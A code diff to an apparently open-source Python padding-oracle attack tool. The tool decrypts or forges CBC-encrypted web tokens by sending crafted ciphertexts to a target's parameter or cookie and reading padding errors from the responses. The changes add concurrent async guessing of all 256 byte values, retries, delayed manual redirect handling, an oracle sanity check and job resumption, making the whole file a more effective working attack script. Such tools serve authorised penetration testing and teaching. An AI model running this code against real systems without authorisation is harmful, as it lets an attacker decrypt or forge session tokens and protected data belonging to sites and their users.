@@ -16,6 +16,8 @@ import validators
 import pickle
 import time
 import base64
+import os
+import asyncio
 
 # httpx does not emit SSL warnings by default when verify=False
 
@@ -107,7 +109,7 @@ def paddify(string,blocksize):
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
 class Job:
     # set variables for the instance
-    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects):
+    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency=5,redirectDelay=0):
 
         print('[*]Initializing job....')
         self.name = name
@@ -144,6 +146,8 @@ class Job:
         self.encodingMode = encodingMode
         self.postFormat = postFormat
         self.followRedirects = followRedirects
+        self.concurrency = concurrency
+        self.redirectDelay = redirectDelay
 
         # establish state on current completed block
         self.currentBlock = 0
@@ -151,14 +155,79 @@ class Job:
         # establish initial state on solved blocks
         self.solvedBlocks = {}
 
+    def __getstate__(self):
+        state = self.__dict__.copy()
+        # httpx clients contain unpicklable thread locks
+        state.pop('client', None)
+        state.pop('async_client', None)
+        state.pop('_semaphore', None)
+        return state
 
-    def initialize(self):
+    def __setstate__(self, state):
+        self.__dict__.update(state)
+
+    def initialize_client(self):
         proxy = None
 
         if self.httpProxyOn:
             proxy = f"http://{self.httpProxyIp}:{self.httpProxyPort}"
 
-        self.client = httpx.Client(proxy=proxy, verify=False, follow_redirects=self.followRedirects)
+        # Always disable auto-redirect; we follow redirects manually so we can
+        # insert a delay (redirectDelay) between the initial response and the
+        # follow-up request.  This is needed when the server stores state (e.g.
+        # error messages in a session variable) that hasn't been committed by
+        # the time the redirect target is loaded.
+        self.client = httpx.Client(proxy=proxy, verify=False, follow_redirects=False)
+        self.async_client = httpx.AsyncClient(proxy=proxy, verify=False, follow_redirects=False,
+                                               limits=httpx.Limits(max_connections=self.concurrency, max_keepalive_connections=self.concurrency))
+        self._semaphore = None
+
+    @property
+    def semaphore(self):
+        if self._semaphore is None:
+            self._semaphore = asyncio.Semaphore(self.concurrency)
+        return self._semaphore
+
+    def oracleSanityCheck(self):
+        """Send a random ciphertext to verify the oracle text is detectable in the response."""
+        print("[*] Running oracle sanity check...")
+
+        # Generate a random 2-block ciphertext that will almost certainly have invalid padding
+        random_ct = os.urandom(self.blocksize * 2)
+
+        if self.encodingMode == 'base64':
+            test_token = urllib.parse.quote_plus(bytes_to_base64(random_ct))
+        elif self.encodingMode == 'base64Url':
+            test_token = bytes_to_base64(random_ct).decode().replace('=','').replace("+","-").replace('/','_')
+        elif self.encodingMode == 'hex':
+            test_token = random_ct.hex().upper()
+
+        result = self.makeRequest(test_token)
+        oracle_text = self.oracleText.lower()
+        found = oracle_text in result.text.lower()
+
+        if self.oracleMode == 'negative':
+            # negative mode: oracleText should appear for bad padding, True (solved) when absent
+            if not found:
+                print(f"[!] WARNING: Oracle text '{self.oracleText}' was NOT found in the response to a random ciphertext.")
+                print(f"[!] In 'negative' mode, the text should appear when padding is INVALID.")
+                print(f"[!] Response preview: {result.text[:500]}")
+                handleError("[x] Oracle sanity check failed. Aborting.")
+            else:
+                print(f"[+] Oracle text found in response. Sanity check passed.")
+
+        elif self.oracleMode == 'search':
+            # search mode: oracleText should appear for valid padding, True (solved) when present
+            if found:
+                print(f"[!] WARNING: Oracle text '{self.oracleText}' was found in the response to a random ciphertext.")
+                print(f"[!] In 'search' mode, the text should only appear when padding is VALID.")
+                print(f"[!] Random ciphertext should almost never have valid padding.")
+                handleError("[x] Oracle sanity check failed. Aborting.")
+            else:
+                print(f"[+] Oracle text not found in random ciphertext response. Sanity check passed.")
+
+    def initialize(self):
+        self.initialize_client()
 
         if self.mode == "decrypt":
             self.decryptInit()
@@ -167,20 +236,59 @@ class Job:
         else:
             handleError("\n[!]Invalid mode value! Exiting.")
 
+        self.oracleSanityCheck()
+
 
     def oracleCheck(self,result):
+        """Check the response against the oracle text.
+
+        'search' mode: returns True when text IS found in response.
+        'negative' mode: returns True when text is NOT found in response.
+
+        In both modes, True = padding is valid (the 1/256 hit).
+        For 'search', set oracleText to something that appears on VALID padding.
+        For 'negative', set oracleText to something that appears on INVALID padding.
+        """
+        response_text = result.text.lower()
+        oracle_text = self.oracleText.lower()
 
         if self.oracleMode == 'search':
-            if self.oracleText in result.text:
-                return True
-            else:
-                return False
+            return oracle_text in response_text
 
         elif self.oracleMode == 'negative':
-            if self.oracleText not in result.text:
-                return True
-            else:
-                return False
+            return oracle_text not in response_text
+
+    def _followRedirect(self, response, headers):
+        """Manually follow a redirect chain (sync), inserting redirectDelay between hops."""
+        max_redirects = 10
+        for _ in range(max_redirects):
+            if response.status_code not in (301, 302, 303, 307, 308):
+                return response
+            location = response.headers.get('location')
+            if not location:
+                return response
+            # Resolve relative URLs
+            redirect_url = urllib.parse.urljoin(str(response.url), location)
+            if self.redirectDelay > 0:
+                time.sleep(self.redirectDelay)
+            # Follow with GET (standard behaviour for 301/302/303)
+            response = self.client.get(redirect_url, headers=headers)
+        return response
+
+    async def _followRedirectAsync(self, response, headers):
+        """Manually follow a redirect chain (async), inserting redirectDelay between hops."""
+        max_redirects = 10
+        for _ in range(max_redirects):
+            if response.status_code not in (301, 302, 303, 307, 308):
+                return response
+            location = response.headers.get('location')
+            if not location:
+                return response
+            redirect_url = urllib.parse.urljoin(str(response.url), location)
+            if self.redirectDelay > 0:
+                await asyncio.sleep(self.redirectDelay)
+            response = await self.async_client.get(redirect_url, headers=headers)
+        return response
 
     # make the HTTP request to the target to check current padding array against padding oracle
     def makeRequest(self,encryptedstring):
@@ -195,55 +303,216 @@ class Job:
         cookieString = makeCookieString(tempcookies)
         self.headers['Cookie'] = cookieString
 
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                if self.httpMethod == "GET":
+
+                    urlBuilder = self.URL
+
+                    if self.inputMode == 'parameter':
+                        # add the vulnerable parameter
+                        urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
+
+                        # if we already set a GET, additionals should start with "&"
+                        firstDelimiter = "&"
+                    else:
+                        firstDelimiter = "?"
+
+                    # add the additional parameters
+                    for idx,additionalParameter in enumerate(self.additionalParameters.items()):
+                        if idx == 0:
+                            delimiter = firstDelimiter
+                        else:
+                            delimiter = '&'
+                        urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1]
+
+
+                    r = self.client.get(urlBuilder,headers=self.headers)
+
+                elif (self.httpMethod == "POST"):
+
+                    # first, get the additional parameters
+                    postData = self.additionalParameters.copy()
+
+                    if self.inputMode == 'parameter':
+
+                        # add the vulnerable parameter
+                        postData[self.vulnerableParameter] = encryptedstring
+
+                    if (self.postFormat == "form-urlencoded"):
+                        self.headers["Content-Type"] = "application/x-www-form-urlencoded"
+                        r = self.client.post(self.URL,data=postData,headers=self.headers)
+
+                    elif (self.postFormat == "multipart"):
+
+                        postData,multipartContentType = encode_multipart(postData)
+                        self.headers['Content-Type'] = multipartContentType
+                        r = self.client.post(self.URL,data=postData,headers=self.headers)
+
+                    elif (self.postFormat == "json"):
+
+                        self.headers["Content-Type"] = "application/json"
+                        r = self.client.post(self.URL,json=postData,headers=self.headers)
+
+                # Manually follow redirects if enabled
+                if self.followRedirects:
+                    r = self._followRedirect(r, self.headers)
+
+                return r
+
+            except (httpx.ConnectError, httpx.TimeoutException, httpx.RemoteProtocolError) as e:
+                if attempt < max_retries - 1:
+                    wait = 2 ** attempt
+                    print(f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})...")
+                    time.sleep(wait)
+                else:
+                    print(f"[!] Network error after {max_retries} attempts: {e}")
+                    raise
+
+    def _buildRequest(self, encryptedstring):
+        """Build the URL/data for a request without sending it. Returns (method, url, kwargs)."""
+        tempcookies = self.cookies.copy()
+        if self.inputMode == "cookie":
+            tempcookies[self.vulnerableParameter] = encryptedstring
+        cookieString = makeCookieString(tempcookies)
+        headers = self.headers.copy()
+        headers['Cookie'] = cookieString
+
         if self.httpMethod == "GET":
-
             urlBuilder = self.URL
-
             if self.inputMode == 'parameter':
-                # add the vulnerable parameter
                 urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
-
-                # if we already set a GET, additionals should start with "&"
                 firstDelimiter = "&"
             else:
                 firstDelimiter = "?"
-
-            # add the additional parameters
             for idx,additionalParameter in enumerate(self.additionalParameters.items()):
                 if idx == 0:
                     delimiter = firstDelimiter
                 else:
                     delimiter = '&'
                 urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1]
+            return ("GET", urlBuilder, {"headers": headers})
 
-
-            r = self.client.get(urlBuilder,headers=self.headers)
-
-        elif (self.httpMethod == "POST"):
-
-            # first, get the additional parameters
+        elif self.httpMethod == "POST":
             postData = self.additionalParameters.copy()
-
             if self.inputMode == 'parameter':
-
-                # add the vulnerable parameter
                 postData[self.vulnerableParameter] = encryptedstring
-
-            if (self.postFormat == "form-urlencoded"):
-                self.headers["Content-Type"] = "application/x-www-form-urlencoded"
-                r = self.client.post(self.URL,data=postData,headers=self.headers)
-
-            elif (self.postFormat == "multipart"):
-
+            if self.postFormat == "form-urlencoded":
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                return ("POST", self.URL, {"data": postData, "headers": headers})
+            elif self.postFormat == "multipart":
                 postData,multipartContentType = encode_multipart(postData)
-                self.headers['Content-Type'] = multipartContentType
-                r = self.client.post(self.URL,data=postData,headers=self.headers)
+                headers['Content-Type'] = multipartContentType
+                return ("POST", self.URL, {"data": postData, "headers": headers})
+            elif self.postFormat == "json":
+                headers["Content-Type"] = "application/json"
+                return ("POST", self.URL, {"json": postData, "headers": headers})
 
-            elif (self.postFormat == "json"):
+    async def makeRequestAsync(self, encryptedstring, progress=None):
+        """Async version of makeRequest using the async client."""
+        method, url, kwargs = self._buildRequest(encryptedstring)
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                if method == "GET":
+                    r = await self.async_client.get(url, **kwargs)
+                else:
+                    r = await self.async_client.post(url, **kwargs)
 
-                self.headers["Content-Type"] = "application/json"
-                r = self.client.post(self.URL,json=postData,headers=self.headers)
-        return r
+                # Manually follow redirects if enabled
+                if self.followRedirects:
+                    r = await self._followRedirectAsync(r, kwargs.get("headers", {}))
+
+                return r
+            except (httpx.ConnectError, httpx.TimeoutException, httpx.RemoteProtocolError) as e:
+                if attempt < max_retries - 1:
+                    wait = 2 ** attempt
+                    if progress is not None:
+                        progress[1] += 1
+                    else:
+                        print(f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})...")
+                    await asyncio.sleep(wait)
+                else:
+                    if progress is None:
+                        print(f"[!] Network error after {max_retries} attempts: {e}")
+                    raise
+
+    async def _testByteValue(self, count, padding_array_template, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt, found_event, progress):
+        """Test a single byte value. Returns (count, result) if oracle passes, None if not."""
+        async with self.semaphore:
+            if found_event.is_set():
+                return None
+
+            padding_array = padding_array_template[:]
+            padding_array[currentbyte] = count
+            for k,v in solved_intermediates.items():
+                padding_array[k] = v ^ padding_num
+
+            if is_encrypt:
+                tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
+            else:
+                tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)
+
+            if self.encodingMode == 'base64':
+                tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))
+            elif self.encodingMode == 'base64Url':
+                tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_')
+            elif self.encodingMode == 'hex':
+                tempToken = tempTokenBytes.hex().upper()
+
+            result = await self.makeRequestAsync(tempToken, progress=progress)
+
+            if found_event.is_set():
+                return None
+
+            progress[0] += 1
+            tested = progress[0]
+            retries = progress[1]
+            bar_len = 30
+            filled = int(bar_len * tested / 256)
+            bar = '█' * filled + '░' * (bar_len - filled)
+            retry_str = f' retries:{retries}' if retries > 0 else ''
+            print(f'\r    Byte {currentbyte:2d}: [{bar}] {tested:3d}/256{retry_str}', end='', flush=True)
+
+            oracle_pass = self.oracleCheck(result)
+            if self.debug:
+                oracle_text = self.oracleText.lower()
+                found_in_resp = oracle_text in result.text.lower()
+                print(f'\n      [DBG] count={count} status={result.status_code} len={len(result.text)} oracle_text_found={found_in_resp} oracle_pass={oracle_pass}')
+            if oracle_pass:
+                found_event.set()
+                return (count, result)
+            return None
+
+    async def solveByteAsync(self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt):
+        """Try all 256 values for a byte position concurrently. Returns (count, result) for the winning value."""
+        padding_array_template = [0] * self.blocksize
+        found_event = asyncio.Event()
+        progress = [0, 0]  # [tested_count, retry_count] shared across tasks
+
+        tasks = []
+        for count in range(256):
+            task = asyncio.create_task(
+                self._testByteValue(count, padding_array_template, currentbyte, padding_num,
+                                    solved_intermediates, block_data, is_encrypt, found_event, progress)
+            )
+            tasks.append(task)
+
+        # Wait for all tasks, but they'll short-circuit via found_event
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Clear the progress line
+        print(f'\r    Byte {currentbyte:2d}: [{("█" * 30)}] FOUND at count={"":<20}', end='')
+
+        for r in results:
+            if r is not None and not isinstance(r, Exception):
+                count_val = r[0]
+                print(f'\r    Byte {currentbyte:2d}: [{"█" * 30}] FOUND at count={count_val} ({progress[0]} tested)')
+                return r
+
+        print(f'\r    Byte {currentbyte:2d}: FAILED - no valid padding found in 256 attempts          ')
+        return None
 
     def fakeIV(self):
         return [0] * self.blocksize
@@ -282,14 +551,12 @@ class Job:
         raise Exception("Block failed to decrypt/encrypt, likely a random network error.")
         #sys.exit(2)
 
-    def encryptBlock(self):
+    async def encryptBlock(self):
         print(f'[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n')
-        padding_array = [0] * self.blocksize
-        solved_intermediates = {} # a place to store the solved intermediates
+        solved_intermediates = {}
         solved_crypto = {}
         padding_num = 1
         currentbyte = self.blocksize - 1
-        # we start with zeros and back calculate the previous block to match
 
         if self.currentBlock == 0:
              previousBlock = [0] * self.blocksize
@@ -297,65 +564,23 @@ class Job:
             previousBlock = list(bytearray(self.solvedBlocks[self.currentBlock - 1]))
 
         for n in range(0,self.blocksize):
-            tempblock = self.blocks[self.currentBlock][:]
 
-            if self.debug:
-                print('[*]CURRENT BLOCK PLAINTEXT:')
-                print('*************************************************')
-                print(tempblock)
-                print('*************************************************\n')
+            result = await self.solveByteAsync(currentbyte, padding_num, solved_intermediates, previousBlock, is_encrypt=True)
 
-            count = 0
-            solved = False
-            while solved == False:
-                if count > 255:
-                    self.encryptBlockFail(padding_array,tempTokenBytes)
-                padding_array[currentbyte] = count #keep changing the same byte in the previous block
+            if result is None:
+                self.encryptBlockFail([0]*self.blocksize, b'')
 
-                for k,v in solved_intermediates.items(): #populate the previous bytes with the correct values based on the changing padding but constant intermediates
-                    padding_array[k] = v ^ padding_num
-                tempTokenBytes = bytes(self.fakeIV() + padding_array + previousBlock) 
+            count, _ = result
+            print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
+            currenti = count ^ padding_num
+            print('[+]The current I value is: ' + str(currenti))
+            solved_intermediates[currentbyte] = currenti
 
-                if self.encodingMode == 'base64':
-                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))
+            currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti
+            print(f'[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n')
+            solved_crypto[currentbyte] = currentcrypto
 
-                if self.encodingMode == 'base64Url':
-                    tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_')
-
-                if self.encodingMode == 'hex':
-                    tempToken = tempTokenBytes.hex().upper()
-                result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring
-
-                if self.debug:
-                    print('[!]Full result text: ' + result.text)
-                    print('[+]Current padding array: ')
-                    print('*************************************************')
-                    print(padding_array)
-                    print('*************************************************\n')
-
-                    print('[*]This is what the encrypted value would look like')
-                    print('*************************************************')
-                    print(tempToken)
-                    print('*************************************************')
-
-                # if the oracleCheck failed... (not solved)
-                if not self.oracleCheck(result):
-                    count = count + 1  #increment the count    
-                else:
-                    solved = True
-                    print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
-                    currenti = count ^ padding_num #if we solved it, get the current intermediate
-                    print('[+]The current I value is: ' + str(currenti))
-                    solved_intermediates[currentbyte] = currenti    
-
-                    #XOR the intermediate and the actual plain text to determine the cipher byte for the next (previous) block      
-                    currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti 
-                    print(f'[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n')
-                    solved_crypto[currentbyte] = currentcrypto
-                    if self.debug:
-                        print(f'[+]cross-check padding level: {str(currenti ^ padding_array[currentbyte])}\n')
-
-            padding_num = padding_num + 1 #increment padding_num and decrement currentbyte
+            padding_num = padding_num + 1
             currentbyte = currentbyte - 1
 
         blockresult = bytes(reversed(list(solved_crypto.values())))
@@ -366,94 +591,57 @@ class Job:
         writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
         return blockresult
 
-    def decryptBlock(self):
+    async def decryptBlock(self):
         print(f"[!]Starting Analysis for block number: {self.currentBlock} OF {self.blockCount}\n")
-        padding_array = [0] * self.blocksize
-        solved_intermediates = {} # a place to store the solved intermediates
+        solved_intermediates = {}
         solved_reals = {}
-        padding_num = 1 #starting at padding one, increase as we work backwards
-        currentbyte = self.blocksize - 1 #start at the last byte according to the length of block
+        padding_num = 1
+        currentbyte = self.blocksize - 1
         # if we are on the first block use the IV as the 'previousBlock'
         if self.currentBlock == 0:
             if self.ivMode == "firstblock" or self.ivMode == "knownIV":
                 previousBlock = self.iv
             else:
-                #This should only happen if we are using unknown IV
-                currentIV = self.fakeIV()
+                previousBlock = self.fakeIV()
         else:
             previousBlock = self.blocks[self.currentBlock - 1]
+
         for n in range(0,self.blocksize):
-            tempblock = self.blocks[self.currentBlock][:] #make a copy of the byte array that we can mess with
+            tempblock = self.blocks[self.currentBlock][:]
 
-            if self.debug:
-                print('[*]CURRENT BLOCK DECIMAL:')
-                print('*************************************************')
-                print(tempblock)
-                print('*************************************************\n')
+            result = await self.solveByteAsync(currentbyte, padding_num, solved_intermediates, tempblock, is_encrypt=False)
 
-            count = 0
-            solved = False
-            while solved == False:
-                # We tried all possible bytes for this position and failed. Something isn't working. 
-                if count > 255:
-                    self.decryptBlockFail(padding_array,tempTokenBytes)
-                padding_array[currentbyte] = count #keep changing the same byte in the previous block
-                for k,v in solved_intermediates.items():
-                    padding_array[k] = v ^ padding_num
+            if result is None:
+                self.decryptBlockFail([0]*self.blocksize, b'')
 
-                tempTokenBytes = bytearray(self.fakeIV() + padding_array + tempblock) #put the bytes back together into a string
+            count, _ = result
+            print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
+            currenti = count ^ padding_num
+            print('[+]The current I value is: ' + str(currenti))
+            solved_intermediates[currentbyte] = currenti
+            currentreal = (previousBlock[currentbyte]) ^ currenti
+            print('[+]real value of last char is: ' + str(currentreal) + '\n')
+            solved_reals[currentbyte] = currentreal
 
-                if self.encodingMode == 'base64':
-                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
-
-                if self.encodingMode == 'base64Url':
-                    tempToken = bytes_to_base64(tempTokenBytes).decode().replace('=','').replace("+","-").replace('/','_')
-
-                if self.encodingMode == 'hex':
-                    tempToken = tempTokenBytes.hex().upper()
-
-                result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring
-
-                if self.debug:
-                    self.verbosePrint(padding_array,tempTokenBytes,tempToken,result.text)
-
-                # if the oracleCheck failed... (not solved)
-                if not self.oracleCheck(result):
-                    count = count + 1  #increment the count
-
-                else:
-                    print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
-                    solved = True
-                    currenti = count ^ padding_num #if we solved it, get the current intermediate
-                    print('[+]The current I value is: ' + str(currenti))
-                    solved_intermediates[currentbyte] = currenti
-                    currentreal = (previousBlock[currentbyte]) ^ currenti #use the current intermediate, and the real last block encryption to find the current real
-                    print('[+]real value of last char is: ' + str(currentreal) + '\n')
-                    solved_reals[currentbyte] = currentreal
-                    if self.debug:
-                        print('[+]cross-check padding level:' + str(currenti ^ padding_array[currentbyte]) + '\n')
-            # increment padding_num and decrement currentbyte
             padding_num = padding_num + 1
             currentbyte = currentbyte - 1
 
         blockresult = bytes(reversed(list(solved_reals.values())))
 
-        # Attempt to convert to an ascii string. If it fails, something probably went wrong.
         try:
             blockresultString = blockresult.decode()
         except:
             blockresultString = blockresult.decode('latin1')
             print("Failed sanity check, but bypassing for now")
-            #raise Exception("Block failed sanity check!")
         writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
         print(f'[!]BLOCK SOLVED: {blockresult}')
         return blockresult
 
-    def nextBlock(self):
+    async def nextBlock(self):
 
         if self.mode == 'decrypt':
             try:
-                result = self.decryptBlock()
+                result = await self.decryptBlock()
 
             except Exception as e:
                 writeToLog(f'[!] decryption of block {self.currentBlock} failed. Error message: {e}')
@@ -461,7 +649,7 @@ class Job:
                 return 1
         if self.mode == 'encrypt':
             try:
-                result = self.encryptBlock()
+                result = await self.encryptBlock()
             except Exception as e:
                 writeToLog(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
                 print(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
@@ -611,7 +799,7 @@ class Job:
         self.blocks = list(reversed(self.blocks))
 
 
-def main():
+async def async_main():
     # argparse setup
     parser = argparse.ArgumentParser()
     parser.add_argument("-r", "--restore", type=str,help="Specify a state file to restore from")
@@ -648,6 +836,8 @@ def main():
         pickleFile = open(args.restore, 'rb')
         job = pickle.load(pickleFile)
         pickleFile.close()
+        # Recreate the httpx client since it can't be pickled
+        job.initialize_client()
         print(job.name)
         print(job.solvedBlocks)
         print(job.currentBlock)
@@ -686,6 +876,8 @@ def main():
         encodingMode = config['default']['encodingMode']
         postFormat = config['default']['postFormat']
         followRedirects = config['default'].getboolean('followRedirects')
+        concurrency = int(config['default'].get('concurrency', '10'))
+        redirectDelay = float(config['default'].get('redirectDelay', '0'))
         # config value validation
         # validate oracleMode
         if not oracleMode:
@@ -772,14 +964,14 @@ def main():
 
 
         # Initialize Job object
-        job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects)
+        job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency,redirectDelay)
         job.initialize()
 
     print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
     writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
 
     while job.currentBlock < (job.blockCount):
-        result = job.nextBlock()
+        result = await job.nextBlock()
         if result == 0:
 
             #Since the block was sucessful, roll to the next one
@@ -834,6 +1026,9 @@ def main():
 
     #job.printProgress()
 
+
+def main():
+    asyncio.run(async_main())
 
 if __name__ == "__main__":
     main()
